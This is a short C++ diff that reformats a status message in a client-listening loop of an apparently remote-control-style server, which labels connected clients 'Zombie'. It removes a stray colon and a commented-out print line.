@@ -36,8 +36,7 @@ void listen_client(Server* serv1, const unsigned short nb)
 				Transfer::downloadFromClient(serv1, args[1]);
 			}
 			else
-				print_status("Zombie : " + std::to_string(nb + 1) + ": " + buffer);
-				//std::cout << "[*] Zombie " << nb + 1 << ": " << buffer << std::endl;
+				print_status("Zombie " + std::to_string(nb + 1) + ": " + buffer);
 		}
 		else
 		{
